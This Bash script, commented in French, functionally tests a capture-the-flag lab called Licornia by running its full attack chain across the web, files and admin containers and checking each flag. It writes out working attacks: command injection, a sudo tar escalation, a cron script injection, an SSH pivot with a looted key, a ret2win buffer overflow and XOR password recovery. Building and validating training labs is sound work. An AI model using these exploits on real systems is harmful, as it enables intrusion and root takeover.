#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# verify-chain.sh — test fonctionnel de TOUTE la chaîne d'attaque découverte,
# machine par machine (web → files → admin). Rejoue chaque catégorie de challenge
# et vérifie le FLAG_* correspondant. Complémentaire de verify-firewall.sh.
#
# Catégories couvertes : Web (injection cmd) · OSINT (EXIF) · Encodage (base64) ·
# Privesc (sudo GTFOBins, cron world-writable) · Forensique (pcap) · Stégano ·
# Crypto (MD5/rockyou) · Réseau/Pivot (clé SSH lootée) · Pwn (BOF ret2win) ·
# Reverse (XOR).
#
# ⚠️ DESTRUCTIF : exécute réellement les exploits (injecte dans le cron de files,
# crée un shell root, etc.). Lancer sur un lab jetable ; `make up` pour réinit.
# Pilote les exploits DIRECTEMENT (pas d'attente des ticks cron).
# ─────────────────────────────────────────────────────────────────────────────
set -u
ROOT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
[ -f "$ROOT_DIR/.env" ] && { set -a; . "$ROOT_DIR/.env"; set +a; }

# Détection compose v1/v2 (comme le Makefile).
if docker compose version >/dev/null 2>&1; then DC=(docker compose); else DC=(docker-compose); fi
dc(){ "${DC[@]}" -f "$ROOT_DIR/docker-compose.yml" "$@"; }

WEB="$(dc ps -q web 2>/dev/null)";   FILES="$(dc ps -q files 2>/dev/null)"
WS="$(dc ps -q workstation 2>/dev/null)"
P="$(basename "$ROOT_DIR")"
: "${WEB:=${P}_web_1}" "${FILES:=${P}_files_1}" "${WS:=${P}_workstation_1}"

WORKSTATION_LAN_IP="${WORKSTATION_LAN_IP:-172.31.20.12}"
A_POMMIER_PW="${A_POMMIER_PW:-applejack}"
ADMIN_MASTER_PW="${ADMIN_MASTER_PW:-twilight-sparkle-42}"
B="http://127.0.0.1:${WEB_PUBLISH_PORT:-8080}"

PASS=0; FAIL=0
ok(){ printf '  \033[32m[ OK ]\033[0m %s\n' "$1"; PASS=$((PASS+1)); }
ko(){ printf '  \033[31m[FAIL]\033[0m %s\n' "$1"; FAIL=$((FAIL+1)); }
h(){ printf '\n\033[1m%s\033[0m\n' "$1"; }

# Lit les FLAG_* attendus directement dans les conteneurs (source de vérité,
# qu'on lance via .env ou via le launcher CTFd). Repli sur l'env du script.
ws_flag(){ docker exec "$1" printenv "$2" 2>/dev/null; }
F_WEB_RCE="$(ws_flag "$WEB" FLAG_WEB_RCE)";         : "${F_WEB_RCE:=${FLAG_WEB_RCE:-}}"
F_WEB_REVERSE="$(ws_flag "$WEB" FLAG_WEB_REVERSE)"; : "${F_WEB_REVERSE:=${FLAG_WEB_REVERSE:-}}"
F_WEB_ROOT="$(ws_flag "$WEB" FLAG_WEB_ROOT)";       : "${F_WEB_ROOT:=${FLAG_WEB_ROOT:-}}"
F_FILES_RECON="$(ws_flag "$FILES" FLAG_FILES_RECON)"; : "${F_FILES_RECON:=${FLAG_FILES_RECON:-}}"
F_DB_PIVOT="$(ws_flag "$FILES" FLAG_DB_PIVOT)";     : "${F_DB_PIVOT:=${FLAG_DB_PIVOT:-}}"
F_DB_ROOT="$(ws_flag "$FILES" FLAG_DB_ROOT)";       : "${F_DB_ROOT:=${FLAG_DB_ROOT:-}}"
F_FILES_RCE="$(ws_flag "$FILES" FLAG_FILES_RCE)";   : "${F_FILES_RCE:=${FLAG_FILES_RCE:-}}"
F_FILES_ROOT="$(ws_flag "$FILES" FLAG_FILES_ROOT)"; : "${F_FILES_ROOT:=${FLAG_FILES_ROOT:-}}"
F_WS_ROOT="$(ws_flag "$WS" FLAG_WS_ROOT)";          : "${F_WS_ROOT:=${FLAG_WS_ROOT:-}}"
F_FINAL="$(ws_flag "$WS" FLAG_FINAL)";              : "${F_FINAL:=${FLAG_FINAL:-}}"

# ══ WEB ══════════════════════════════════════════════════════════════════════
h "WEB (DMZ) — Web / OSINT / Encodage / Privesc"

# [Web] site en ligne
[ "$(curl -s -o /dev/null -w '%{http_code}' "$B/")" = 200 ] \
  && ok "site Licornia en ligne (accueil 200)" || ko "site KO"

# [Web] injection de commande sur /outils.php (champ host) → lecture flag www-data
RCE="$(curl -s "$B/outils.php" --data-urlencode 'host=127.0.0.1;cat /var/www/flag_user.txt' -G)"
echo "$RCE" | grep -qF "$F_WEB_RCE" \
  && ok "injection de commande (/outils.php) → FLAG_WEB_RCE (www-data)" \
  || ko "injection de commande KO (flag www-data non lu)"

# [OSINT] flag dans les métadonnées EXIF de la brochure
EXIF="$(docker exec "$WEB" exiftool -s3 -Comment /var/www/app/public/brochure-licornia.jpg 2>/dev/null)"
echo "$EXIF" | grep -qF "$F_WEB_REVERSE" \
  && ok "métadonnées EXIF de la brochure → FLAG_WEB_REVERSE (OSINT)" \
  || ko "EXIF brochure KO (flag OSINT absent)"

# [Encodage] creds base64 dans la conf laissée par le dev → a.pommier:<pw>
DEC="$(docker exec -u www-data "$WEB" sh -c "grep -o \"'[A-Za-z0-9+/=]\\{8,\\}'\" /var/www/app/config/backup.inc.php | tr -d \"'\" | base64 -d 2>/dev/null")"
[ "$DEC" = "a.pommier:${A_POMMIER_PW}" ] \
  && ok "creds base64 (backup.inc.php) décodés → ${DEC} (encodage ≠ chiffrement)" \
  || ko "décodage base64 KO (obtenu: '${DEC}')"

# [Privesc] www-data ne lit PAS /root, mais sudo tar (GTFOBins) → root
docker exec -u www-data "$WEB" cat /root/flag_root.txt >/dev/null 2>&1 \
  && ko "www-data lit /root/flag_root (perms cassées!)" \
  || ok "www-data ne lit pas /root/flag_root (perms)"
WROOT="$(docker exec -u www-data "$WEB" sh -c \
  'sudo -n tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="sh -c \"id; cat /root/flag_root.txt\"" 2>/dev/null')"
echo "$WROOT" | grep -q 'uid=0(root)' \
  && ok "sudo tar GTFOBins (NOPASSWD) : www-data → root" || ko "sudo tar GTFOBins KO (pas de root)"
echo "$WROOT" | grep -qF "$F_WEB_ROOT" \
  && ok "FLAG_WEB_ROOT lu en root sur web" || ko "FLAG_WEB_ROOT non lu"

# ══ FILES ════════════════════════════════════════════════════════════════════
h "FILES (LAN, via pivot) — Recon SMB / Forensique / Stégano / Crypto / Privesc"

# [Recon] partage SMB anonyme → note interne avec le token de recon
docker exec "$FILES" sh -c 'rm -f /tmp/vc_note; smbclient -N //127.0.0.1/public -c "get note-interne.txt /tmp/vc_note" >/dev/null 2>&1'
docker exec "$FILES" sh -c 'cat /tmp/vc_note 2>/dev/null; rm -f /tmp/vc_note' | grep -qF "$F_FILES_RECON" \
  && ok "SMB anonyme (//public) → FLAG_FILES_RECON (recon)" || ko "SMB anonyme KO (recon)"

# [Forensique] capture.pcap en clair → login de l'agent
docker exec "$FILES" sh -c 'strings /srv/public/capture.pcap 2>/dev/null' | grep -qF "$F_DB_PIVOT" \
  && ok "pcap en clair (strings/tshark) → FLAG_DB_PIVOT (forensique)" || ko "pcap forensique KO"

# [Stégano] flag appended dans l'image
docker exec "$FILES" sh -c 'strings /srv/public/photo-poney.jpg 2>/dev/null' | grep -qF "$F_DB_ROOT" \
  && ok "stégano image (strings/binwalk) → FLAG_DB_ROOT" || ko "stégano KO"

# [Crypto] hash MD5 de a.pommier crackable (rockyou) = applejack → accès RH
MD5="$(printf '%s' "$A_POMMIER_PW" | md5sum | cut -d' ' -f1)"
docker exec "$FILES" sh -c 'cat /srv/public/backup/hashes.txt 2>/dev/null' | grep -q "a.pommier:${MD5}" \
  && ok "hash MD5 a.pommier = md5(${A_POMMIER_PW}) (crackable rockyou)" || ko "hash MD5 a.pommier absent/incohérent"
docker exec "$FILES" su a.pommier -c 'cat /srv/rh/flag_rce.txt' 2>/dev/null | grep -qF "$F_FILES_RCE" \
  && ok "compte a.pommier (mdp craqué) lit /srv/rh → FLAG_FILES_RCE" || ko "accès RH a.pommier KO"

# [Privesc] cron root exécutant un script world-writable → injection → root
PERMS="$(docker exec "$FILES" stat -c '%a' /opt/licornia/maintenance.sh 2>/dev/null)"
case "$PERMS" in
  *[2367]) ok "maintenance.sh world-writable (perms ${PERMS}) — exécuté par cron root" ;;
  *) ko "maintenance.sh PAS world-writable (perms ${PERMS})" ;;
esac
# On simule le tick cron (exécution root du script) après injection par a.pommier.
docker exec "$FILES" sh -c 'cp -p /opt/licornia/maintenance.sh /tmp/vc_maint.bak'
docker exec -u a.pommier "$FILES" sh -c 'printf "\ncat /root/flag_root.txt > /tmp/vc_cron.txt 2>&1; chmod 644 /tmp/vc_cron.txt\n" >> /opt/licornia/maintenance.sh'
docker exec "$FILES" sh -c 'rm -f /tmp/vc_cron.txt; /bin/sh /opt/licornia/maintenance.sh >/dev/null 2>&1'   # = ce que fait cron (root)
docker exec "$FILES" sh -c 'cat /tmp/vc_cron.txt 2>/dev/null' | grep -qF "$F_FILES_ROOT" \
  && ok "cron root + script world-writable → FLAG_FILES_ROOT (privesc)" || ko "privesc cron KO"
# Restauration du script propre.
docker exec "$FILES" sh -c 'mv /tmp/vc_maint.bak /opt/licornia/maintenance.sh; chmod 666 /opt/licornia/maintenance.sh; rm -f /tmp/vc_cron.txt'

# [Loot] clé SSH de l'admin présente sur /root (gate vers admin)
docker exec "$FILES" test -f /root/id_admin \
  && ok "clé SSH c.vasseur lootée sur files (/root/id_admin)" || ko "clé SSH admin absente (gate cassée)"

# ══ ADMIN (workstation) ══════════════════════════════════════════════════════
h "ADMIN (LAN, via clé SSH) — Pivot / Pwn / Reverse / FINAL"

# [Pivot] rebond SSH files → admin avec la clé lootée → on atterrit en c.vasseur
SSHID="$(docker exec "$FILES" sh -c "ssh -i /root/id_admin -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 c.vasseur@${WORKSTATION_LAN_IP} 'id' 2>/dev/null")"
echo "$SSHID" | grep -q 'c.vasseur' \
  && ok "rebond SSH (clé lootée) files → admin = c.vasseur" || ko "rebond SSH vers admin KO"

# [Pwn] BOF ret2win sur le SUID vault → root → FLAG_WS_ROOT
# Adresse de win() extraite dynamiquement (objdump hôte) ; repli sur l'adresse connue.
docker cp "$WS":/usr/local/bin/vault /tmp/vc_vault >/dev/null 2>&1
WIN="$(objdump -d /tmp/vc_vault 2>/dev/null | awk '/<win>:/{print "0x"$1; exit}')"
rm -f /tmp/vc_vault
[ -n "$WIN" ] || WIN="0x401196"
# offset 72 = buf[64] + rbp sauvé(8) ; charge utile puis (après pause) commandes au shell.
WSROOT="$( { python3 -c "import sys;sys.stdout.buffer.write(b'A'*72+(${WIN}).to_bytes(8,'little'))"; sleep 1; \
            printf 'id; cat /root/flag_root.txt\n'; sleep 1; } \
          | docker exec -i -u c.vasseur "$WS" /usr/local/bin/vault 2>/dev/null )"
echo "$WSROOT" | grep -q 'uid=0(root)' \
  && ok "BOF ret2win sur vault (win=${WIN}, offset 72) : c.vasseur → root" || ko "BOF vault KO (pas de root)"
echo "$WSROOT" | grep -qF "$F_WS_ROOT" \
  && ok "FLAG_WS_ROOT lu en root sur admin (pwn)" || ko "FLAG_WS_ROOT non lu"

# [Reverse] dé-XOR du binaire licornia-check → mot de passe maître → trophée FINAL
MASTER="$(python3 -c "
enc=[0x2f,0x2c,0x32,0x37,0x32,0x3c,0x33,0x2f,0x76,0x28,0x2b,0x3a,0x29,0x30,0x37,0x3e,0x76,0x6f,0x69]
print(''.join(chr(b^0x5b) for b in enc))")"
[ "$MASTER" = "$ADMIN_MASTER_PW" ] \
  && ok "reverse XOR (enc ^ 0x5b) → mot de passe maître « ${MASTER} »" \
  || ko "reverse XOR KO (obtenu: '${MASTER}')"
FINAL="$(printf '%s\n' "$MASTER" | docker exec -i -u c.vasseur "$WS" /usr/local/bin/licornia-check 2>/dev/null)"
echo "$FINAL" | grep -qF "$F_FINAL" \
  && ok "licornia-check (SUID) + mdp maître → FLAG_FINAL (prise du domaine)" || ko "FLAG_FINAL KO"

# ══ BILAN ════════════════════════════════════════════════════════════════════
h "Bilan chaîne découverte : ${PASS} OK / ${FAIL} FAIL"
[ "$FAIL" -eq 0 ] && echo "Toute la chaîne d'attaque découverte est fonctionnelle." || exit 1
